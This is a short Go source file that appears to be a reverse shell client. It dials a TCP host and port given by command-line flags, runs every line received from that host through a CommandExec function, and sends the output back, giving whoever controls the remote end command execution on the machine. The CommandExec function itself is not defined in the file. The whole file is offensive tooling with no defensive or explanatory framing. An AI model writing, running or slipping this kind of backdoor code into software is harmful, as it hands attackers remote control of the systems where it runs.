package main

import (
  "bufio"
  "flag"
  "fmt"
  "net"
)

var (
  ip, port string
)

func getCommand(scanner *bufio.Scanner, conn net.Conn) {
  for scanner.Scan() {
    cmd := scanner.Text()
    result := CommandExec(cmd)
    fmt.Fprintf(conn, result)
  }
  if err := scanner.Err(); err != nil {
    panic(err)
  }
}

func init() {
  flag.StringVar(&ip, "ip", "127.0.0.1", "target host")
  flag.StringVar(&port, "port", "80", "target port")
}

func main() {
  flag.Parse()

  t := net.JoinHostPort(ip, port)
  conn, err := net.Dial("tcp", t)
  if err != nil {
    panic(err)
  }
  connReader := bufio.NewReader(conn)
  scanner := bufio.NewScanner(connReader)
  getCommand(scanner, conn)
}

